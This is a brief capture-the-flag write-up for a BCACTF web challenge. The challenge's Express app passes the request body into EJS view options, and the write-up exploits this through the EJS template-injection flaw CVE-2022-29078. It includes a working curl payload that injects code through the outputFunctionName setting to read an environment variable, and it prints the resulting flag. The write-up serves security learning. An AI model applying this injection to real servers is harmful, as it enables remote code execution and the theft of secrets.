---
created: 2024-06-10T01:41
updated: 2024-06-10T23:17
---

> This old service lets you make some interesting queries. It hasn't been updated in a while, though.

---

```js
res.render('search', {
	summary,
	notFound: false,
	...req.body
})
```

The server dumped all of our form body into express view options, ~~that's great~~ that's not good, …and `ejs@3.1.6` has a 9.8/10 RCE.

Find more info here [EJS, Server side template injection RCE (CVE-2022-29078) - writeup | ~#whoami Eslam Salem](https://eslam.io/posts/ejs-server-side-template-injection-rce/).

With the information we have we can create our payload easily.

```sh
curl --request POST \
  --url http://challs.bcactf.com:30684/ \
  --header 'Content-Type: application/x-www-form-urlencoded' \
  --data breed=pekin \
  --data 'settings[view options][outputFunctionName]=x;__output+=Deno.env.get("FLAG");s'
```

And boom, our flag is here.

```
bcactf{a_l1Ttl3_0uTd4T3d_qYR8IeICVTLPU0uK}
```
